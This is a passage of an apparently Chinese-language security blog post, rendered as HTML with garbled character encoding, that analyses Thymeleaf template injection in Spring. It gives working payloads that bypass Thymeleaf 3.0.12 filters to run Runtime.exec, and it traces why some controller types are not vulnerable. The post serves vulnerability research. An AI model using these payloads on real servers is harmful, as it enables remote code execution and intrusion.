<span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// åˆ¤æ–­(å·¦è¾¹æ˜¯å¦ä¸ºT,Tæ˜¯å¦ä¸ºè¡¨è¾¾å¼é¦–å­—æ¯</span><br>                    <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; c == <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; n - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; expression.charAt(n - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;T&#x27;</span> &amp;&amp; (n - <span class="hljs-number">1</span> == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">2</span>)))) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; !Character.isJavaIdentifierPart(c) &amp;&amp; c != <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                        si = -<span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            ++ni;<br>            <span class="hljs-keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥æ®µä»£ç å°±æ˜¯åšäº†ä¸¤ä¸ªåˆ¤æ–­</p><ul><li>ä¸èƒ½åŒ…å«new</li><li><code>(</code>å·¦è¾¹ä¸èƒ½ä¸ºT</li></ul><p>å½“æ»¡è¶³è¿™äº›æ¡ä»¶æ—¶ä¼šè¿”å›<code>true</code>ï¼Œå¯¼è‡´ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p>æƒ³è¦ç»•è¿‡çš„è¯éœ€è¦æ»¡è¶³ï¼š</p><blockquote><p>1.ä¸èƒ½æœ‰newï¼Œæ‰€ä»¥expä¸­ä¸èƒ½æœ‰new</p><p>2.<code>(</code>å·¦è¾¹çš„å­—ç¬¦ä¸èƒ½ä¸ºTï¼Œæ‰€ä»¥éœ€è¦åœ¨<code>(</code>å·¦è¾¹å¢åŠ ä¸€äº›å…¶ä»–å­—ç¬¦ä¸å½±å“è¯­å¥çš„å­—ç¬¦</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ­¤å¤„ç”±äºä½¿ç”¨çš„æ˜¯postä¼ å‚ï¼Œæ‰€ä»¥æˆ‘èƒ½åˆ—ä¸¾å‡ºæ¥çš„å¦‚ä¸‹</span><br><span class="hljs-comment">// 1.å¢åŠ ç©ºæ ¼</span><br>__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br><span class="hljs-comment">// 2.åˆ¶è¡¨ç¬¦</span><br>__$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br><span class="hljs-comment">// 3.æ¢è¡Œç¬¦</span><br>__$&#123;T<br>(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A540.png"></p><h5 id="3-0-12-åœºæ™¯2ç»•è¿‡"><a href="#3-0-12-åœºæ™¯2ç»•è¿‡" class="headerlink" title="3.0.12 åœºæ™¯2ç»•è¿‡"></a>3.0.12 åœºæ™¯2ç»•è¿‡</h5><p>è¿™ä¸ªåœºæ™¯æ˜¯åœ¨<a href="https://www.cnpanda.net/sec/1063.html">panda</a>è¿™ä½å¸ˆå‚…çš„æ–‡ç« ä¸Šå­¦åˆ°çš„ï¼Œå‘å¸ˆå‚…è‡´æ•¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// controller è§†å›¾åç§°åŒ…å«åœ¨URLçš„è·¯å¾„æˆ–å‚æ•°ä¸­</span><br><span class="hljs-meta">@GetMapping(&quot;/home/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest03</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;home/&quot;</span> + path;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æ­¤ç§åœºæ™¯æ—¶ï¼Œä¸Šè¿°çš„expæ˜¯æ— æ³•å®ç°çš„</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A541.png"></p><p>æ˜¯å› ä¸ºåœ¨3.0.12æ–°å¢äº†SpringRequestUtils.javaè¯¥ç±»ï¼Œå½“<em>è§†å›¾çš„åå­—å’Œ path ä¸€è‡´</em>ä¼šç»è¿‡è¯¥ç±»çš„</p><p><code>checkViewNameNotInRequest()</code>æ–¹æ³•è¿›è¡Œæ£€æµ‹</p><p>è¯¥æ–¹æ³•æ˜¯åœ¨<code>org.thymeleaf.spring5.view.ThymeleafView</code>ç¬¬106è¡Œæ—¶è¿›è¡Œè°ƒç”¨</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A542.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkViewNameNotInRequest</span><span class="hljs-params">(String viewName, HttpServletRequest request)</span> </span>&#123;<br>    String vn = StringUtils.pack(viewName);<br>    String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br>    <span class="hljs-keyword">boolean</span> found = requestURI != <span class="hljs-keyword">null</span> &amp;&amp; requestURI.contains(vn);<br>    <span class="hljs-comment">// URIä¸ä¸ºç©ºæ—¶ï¼ŒURIä¸­åŒ…å«è§†å›¾åæ—¶ foundä¸ºtrue</span><br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        Enumeration paramNames = request.getParameterNames();<br><br>        <span class="hljs-keyword">while</span>(!found &amp;&amp; paramNames.hasMoreElements()) &#123;<br>            String[] paramValues = request.getParameterValues((String)paramNames.nextElement());<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; ++i) &#123;<br>                String paramValue = StringUtils.pack(UriEscape.unescapeUriQueryParam(paramValues[i]));<br>                <span class="hljs-keyword">if</span> (paramValue.contains(vn)) &#123;<span class="hljs-comment">// å¦‚æœå‚æ•°å€¼ä¸­åŒ…å«ViewNameä¹ŸæŠ›å‡ºå¼‚å¸¸</span><br>                    found = <span class="hljs-keyword">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (found) &#123;<span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TemplateProcessingException(<span class="hljs-string">&quot;View name is an executable expression, and it is present in a literal manner in request path or parameters, which is forbidden for security reasons.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å› æ­¤æƒ³è¦ç»•è¿‡ï¼Œåˆ™éœ€è¦<code>requestURI.contains(vn)</code>å€¼ä¸ºå‡ï¼Œå…·ä½“åˆ†æè¿‡ç¨‹å‚è€ƒå¸ˆå‚…çš„æ–‡ç« ï¼Œåœ¨æ­¤å°±ä¸è¯´äº†ï¼Œç›´æ¥æ”¾ä¸ŠEXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">home<span class="hljs-comment">//__$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)&#125;__::.x</span><br>home;/__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure><blockquote><p>exp2:</p><p>SpringBoot æœ‰ä¸€ä¸ªåŠŸèƒ½å«åšçŸ©é˜µå˜é‡ï¼Œé»˜è®¤æ˜¯ç¦ç”¨çŠ¶æ€ï¼š</p><p>å¦‚æœå‘ç°è·¯å¾„ä¸­å­˜åœ¨åˆ†å·ï¼Œé‚£ä¹ˆä¼šè°ƒç”¨<code>removeSemicolonContent</code>æ–¹æ³•æ¥ç§»é™¤åˆ†å·</p></blockquote><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A543.png"></p><h5 id="3-0-14"><a href="#3-0-14" class="headerlink" title="3.0.14"></a>3.0.14</h5><p>è¿™ä¸ªç‰ˆæœ¬çš„<code>checkViewNameNotInRequest()</code>æœ‰äº†ä¸€äº›æ”¹åŠ¨ï¼Œè¿™ä¸ªæš‚æ—¶è¿˜ä¸çŸ¥é“è¯¥å¦‚ä½•è¿‡å»ğŸ˜­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkViewNameNotInRequest</span><span class="hljs-params">(String viewName, HttpServletRequest request)</span> </span>&#123;<br>    String vn = StringUtils.pack(viewName);<span class="hljs-comment">// è·å–è§†å›¾å</span><br>    <span class="hljs-keyword">if</span> (containsExpression(vn)) &#123;<span class="hljs-comment">// åˆ¤æ–­è§†å›¾åä¸­æ˜¯å¦åŒ…å«thymeleafçš„ä¸€äº›è¡¨è¾¾å¼</span><br>        <span class="hljs-keyword">boolean</span> found = <span class="hljs-keyword">false</span>;<br>        <span class="hljs-comment">// è·å–URI</span><br>        String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br>        <span class="hljs-keyword">if</span> (requestURI != <span class="hljs-keyword">null</span> &amp;&amp; containsExpression(requestURI)) &#123;<span class="hljs-comment">// URIä¸ä¸ºç©ºï¼Œä¸”URIä¸­åŒ…å«è¡¨è¾¾å¼ï¼Œç›´æ¥G</span><br>            found = <span class="hljs-keyword">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!found) &#123;<br>            Enumeration paramNames = request.getParameterNames();<span class="hljs-comment">// è·å–å‚æ•°åå¹¶å­˜å…¥åˆ°æšä¸¾å¯¹è±¡ä¸­</span><br><br>            <span class="hljs-keyword">while</span>(!found &amp;&amp; paramNames.hasMoreElements()) &#123;<span class="hljs-comment">// å­˜åœ¨æšä¸¾å…ƒç´ </span><br>                <span class="hljs-comment">// è·å–æ‰€æœ‰å‚æ•°å€¼ï¼Œå­˜å…¥String[] ä¸­</span><br>                String[] paramValues = request.getParameterValues((String)paramNames.nextElement());<br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; ++i) &#123;<br>                    String paramValue = StringUtils.pack(paramValues[i]);<span class="hljs-comment">// å–å‡ºå‚æ•°å€¼</span><br>                    <span class="hljs-comment">// å‚æ•°å€¼ä¸ä¸ºç©ºï¼Œå¹¶ä¸”å‚æ•°å€¼ä¸­åŒ…å«è¡¨è¾¾å¼ï¼Œå¹¶ä¸”è§†å›¾åç§°ä¸­åŒ…å«è¯¥å‚æ•°å€¼ï¼Œåˆ™G</span><br>                    <span class="hljs-keyword">if</span> (paramValue != <span class="hljs-keyword">null</span> &amp;&amp; containsExpression(paramValue) &amp;&amp; vn.contains(paramValue)) &#123;<br>                        found = <span class="hljs-keyword">true</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (found) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TemplateProcessingException(<span class="hljs-string">&quot;View name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-ResponseBody"><a href="#2-ResponseBody" class="headerlink" title="2.@ResponseBody"></a>2.@ResponseBody</h4><p>@responseBodyæ³¨è§£çš„ä½œç”¨æ˜¯å°†controllerçš„æ–¹æ³•è¿”å›çš„å¯¹è±¡é€šè¿‡é€‚å½“çš„è½¬æ¢å™¨è½¬æ¢ä¸ºæŒ‡å®šçš„æ ¼å¼ä¹‹åï¼Œå†™å…¥åˆ°responseå¯¹è±¡çš„bodyåŒºï¼Œé€šå¸¸ç”¨æ¥è¿”å›JSONæ•°æ®æˆ–è€…æ˜¯XMLæ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´ç°åœ¨æœåŠ¡ç«¯è¿”å›çš„åªæ˜¯ä¸€æ®µæ•°æ®ï¼ˆæ•°æ®æ ¼å¼éœ€è¦è‡ªè¡ŒæŒ‡å®šï¼‰ï¼Œä¸å†æ˜¯ä¸€ä¸ªæ¸²æŸ“ä¹‹åçš„è§†å›¾äº†ï¼Œä¸éœ€è¦æ¸²æŸ“ï¼Œè‡ªç„¶ä¸ä¼šå­˜åœ¨è¡¨è¾¾å¼è§£æç­‰æ­¥éª¤ï¼Œæ‰€ä»¥æ­¤æ—¶ä¸ä¼šå­˜åœ¨ã€‚</p><p>ç¤ºä¾‹ï¼šæ­¤å¤„å°†controllerçš„è¿”å›å€¼ä¸ºStringï¼Œå¹¶ä¸”æœ‰@responseBodyæ³¨è§£ï¼Œä¸ä¼šå†è¿›è¡Œæ¸²æŸ“ï¼Œæ‰€ä»¥åªæ˜¯å°†pathè¿›è¡Œæ‹¼æ¥ä¹‹åè¿”å›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A521.png"></p><h4 id="3-redirect"><a href="#3-redirect" class="headerlink" title="3.redirect"></a>3.redirect</h4><p>é‡å®šå‘ï¼Œç›´æ¥è·³è½¬åˆ°å…¶ä»–é¡µé¢ï¼Œæ­¤æ—¶æ˜¯å› ä¸ºspringmvcä¸å†ä½¿ç”¨Thymeleafè§†å›¾è§£æå™¨ï¼Œæ‰€ä»¥å¯¼è‡´æ¼æ´ä¸å­˜åœ¨äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A528.png"></p><h4 id="4-HttpServletResponse"><a href="#4-HttpServletResponse" class="headerlink" title="4.HttpServletResponse"></a>4.HttpServletResponse</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">(HttpServletResponse response)</span></span>&#123;<br>        log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰è¿”å›ï¼Œå½“å‚æ•°ä¸­å­˜åœ¨HttpServletResponseæ—¶ï¼ŒSpringMVCè®¤ä¸ºæ­¤æ—¶ç”¨æˆ·è‡ªå®šä¹‰äº†è¿”å›æ•°æ®ï¼Œæ— éœ€SpringMVCå¸®åŠ©å¤„ç†ï¼Œæ‰€ä»¥æ­¤ç§æƒ…å†µä¸‹åŒæ ·ä¸å­˜åœ¨æ¼æ´</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A529.png"></p><p>å…¶åŸå› æ˜¯å½“æ§åˆ¶å™¨å­˜åœ¨HttpServletResponseç±»å‹çš„å‚æ•°æ—¶ï¼Œåœ¨è·å–å˜é‡æ—¶ä¼šå°†<code>ModelAndViewContainer</code>å¯¹è±¡çš„<code>requestHandled</code>å€¼ç½®ä¸ºtrueï¼Œè¿›è€Œå¯¼è‡´<code>ModelAndViewContainer</code>å¯¹è±¡ä¸ºnullï¼Œä¹Ÿå°±æ˜¯mvä¸ºnullã€‚å…·ä½“åˆ†ææ€è·¯å¦‚ä¸‹</p><p><code>DispatchServlet</code>    <code>ha.handle(processedRequest, response, mappedHandler.getHandler())</code> å¤„ä¸‹æ–­ï¼Œè·Ÿè¿›handleæ–¹æ³•</p><p>æ¥åˆ°<code>this.handleInternal(request, response, (HandlerMethod)handler);</code>ï¼Œç»§ç»­è·Ÿè¿›</p><p>æ¥åˆ°<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter</code> çš„ <code>handleInternal</code>æ–¹æ³•</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A530.png"></p><p>æ¥åˆ°è¯¥ç±»çš„<code>invokeHandlerMethod()</code>ï¼Œä¸€äº›åŸºç¡€è®¾ç½®æ²¡å¿…è¦çœ‹ï¼Œç›´æ¥åˆ°æ¥ç¬¬543è¡Œï¼Œè·Ÿè¿›</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A531.png"></p><p>æ¥åˆ°è¯¥ç±»çš„<code>invokeAndHandle</code>æ–¹æ³•ï¼Œç›´æ¥è·Ÿè¿›<code>this.invokeForRequest(webRequest, mavContainer, providedArgs);</code></p><p>æ¥åˆ°<code>org.springframework.web.method.support.InvocableHandlerMethod</code>çš„<code>invokeForRequest</code>æ–¹æ³•</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A532.png"></p><p>æ¥åˆ°<code>getMethodArgumentValues</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æœ¬èº«æ˜¯ç”¨æ¥è·å–å‚æ•°çš„ï¼Œä½†æ˜¯<code>args[i] = this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory);</code>è¿™ä¸€è¡Œä¼šæ”¹å˜<code>mavContainer</code>ä¸­<code>requestHandled</code>çš„å€¼ï¼Œç›´æ¥è·Ÿè¿›è¿™ä¸€è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer, Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br>    MethodParameter[] parameters = <span class="hljs-keyword">this</span>.getMethodParameters();<br>    <span class="hljs-keyword">if</span> (ObjectUtils.isEmpty(parameters)) &#123;<span class="hljs-comment">// åˆ¤æ–­å‚æ•°åˆ—è¡¨æ˜¯å¦ä¸ºç©º</span><br>        <span class="hljs-keyword">return</span> EMPTY_ARGS;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object[] args = <span class="hljs-keyword">new</span> Object[parameters.length];<span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªObjectæ•°æ®ï¼Œå‡†å¤‡æ¥æ”¶å‚æ•°</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; parameters.length; ++i) &#123;<span class="hljs-comment">// éå†å‚æ•°åˆ—è¡¨</span><br>            MethodParameter parameter = parameters[i];<br>            parameter.initParameterNameDiscovery(<span class="hljs-keyword">this</span>.parameterNameDiscoverer);<span class="hljs-comment">// å‚æ•°åˆå§‹åŒ–</span><br>            args[i] = findProvidedArgument(parameter, providedArgs);<span class="hljs-comment">// ä¸€ç§å‡å®šï¼Ÿï¼Ÿä¸æ˜¯å¾ˆç†è§£ï¼Œä½†ä¸é‡è¦</span><br>            <span class="hljs-keyword">if</span> (args[i] == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.resolvers.supportsParameter(parameter)) &#123;<br>                    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æœ‰åˆé€‚çš„å‚æ•°è§£æå™¨ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­æ˜¯å¦æ”¯æŒè¯¥å‚æ•°ç±»å‹</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    args[i] = <span class="hljs-keyword">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-keyword">this</span>.dataBinderFactory);<span class="hljs-comment">// è·å–å‚æ•°ï¼Œä»¥åŠå½“å‚æ•°ç±»å‹ä¸ºHttpServletResponseæ—¶åšä¸€äº›è®¾ç½®</span><br>                &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.logger.isDebugEnabled()) &#123;<br>                        String exMsg = var10.getMessage();<br>                        <span class="hljs-keyword">if</span> (exMsg != <span class="hljs-keyword">null</span> &amp;&amp; !exMsg.contains(parameter.getExecutable().toGenericString())) &#123;<br>                            <span class="hljs-keyword">this</span>.logger.debug(formatArgumentError(parameter, exMsg));<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">throw</span> var10;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> args;<span class="hljs-comment">// è¿”å›å‚æ•°åˆ—è¡¨</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥åˆ°<code>org.springframework.web.method.support.HandlerMethodArgumentResolverComposite</code>çš„<code>resolveArgument</code>æ–¹æ³•</p><p>å½“å‚æ•°ç±»å‹æ˜¯ï¼šæ™®é€šå‚æ•°ç±»å‹ï¼ˆä¾‹å¦‚ï¼šString\Integer\Doubleï¼‰æ—¶</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A533.png"></p><p>æ­¤æ—¶è·Ÿè¿›ç¬¬65è¡Œï¼Œè¿›å…¥åˆ°<code>org.springframework.web.method.annotation.AbstractNamedValueMethodArgumentResolver</code>çš„<code>resolveArgument</code>æ–¹æ³•ä¸­</p><p>å½“å‚æ•°ç±»å‹æ˜¯ï¼šHttpServletResponseæ—¶</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A534.png"></p><p>æ­¤æ—¶è·Ÿè¿›ç¬¬65è¡Œï¼Œè¿›å…¥åˆ°<code>org.springframework.web.servlet.mvc.method.annotation.ServletResponseMethodArgumentResolver</code>çš„<code>resolveArgument</code>æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer, NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-keyword">if</span> (mavContainer != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// ä¸ºçœŸ</span><br>        mavContainer.setRequestHandled(<span class="hljs-keyword">true</span>);  <span class="hljs-comment">// requestHandledçš„å€¼è®¾ç½®ä¸ºtrue</span><br>    &#125;<br><br>    Class&lt;?&gt; paramType = parameter.getParameterType();<br>    <span class="hljs-keyword">return</span> ServletResponse.class.isAssignableFrom(paramType) ? <span class="hljs-keyword">this</span>.resolveNativeResponse(webRequest, paramType) : <span class="hljs-keyword">this</span>.resolveArgument(paramType, (ServletResponse)<span class="hljs-keyword">this</span>.resolveNativeResponse(webRequest, ServletResponse.class));<br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ°<code>RequestMappingHandlerAdapter</code>ç¬¬545è¡Œï¼Œè·Ÿè¿›</p><p><img 